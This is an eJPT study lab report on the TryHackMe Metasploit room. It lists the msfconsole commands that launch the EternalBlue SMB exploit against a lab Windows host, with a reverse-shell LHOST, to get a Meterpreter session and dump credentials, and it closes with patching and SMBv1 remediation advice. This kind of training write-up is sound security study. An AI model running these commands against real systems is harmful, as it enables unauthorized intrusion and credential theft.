# Lab Report: TryHackMe - Metasploit Framework

- **Certification Track:** eJPT
- **Domain:** Network Attacks
- **Platform:** TryHackMe
- **Date Completed:** 2026-10-03
- **Time Invested:** 1.0 Hours
- **Core Skills & Tools:** msfconsole, meterpreter, searchsploit

---

## 1. Executive Summary
The target environment consisted of a vulnerable Windows host. The objective was to configure and launch exploits via the Metasploit Framework to gain shell access and establish a Meterpreter session.

## 2. Key Objectives & Methodologies
* Search for available exploits for enumerated service versions.
* Configure exploit payload variables (LHOST, LPORT, RHOSTS).
* Execute the attack to compromise the system and dump credentials.

## 3. Commands Executed & Payloads Used
`ash
msfconsole -q
search type:exploit platform:windows
use exploit/windows/smb/ms17_010_eternalblue
set RHOSTS 10.10.10.10
set LHOST 10.9.9.9
exploit
`

## 4. Artifact Embedding
| PROOF-01 | Meterpreter session established | *Terminal Log Verification - Output Recorded in Section 3* |

## 5. Defensive Takeaways
* **Root Cause:** Missing critical OS security patches allowed remote code execution via SMB.
* **Remediation:** Establish a rigorous and rapid patch management program. Disable SMBv1 across the network and segment vulnerable legacy systems.
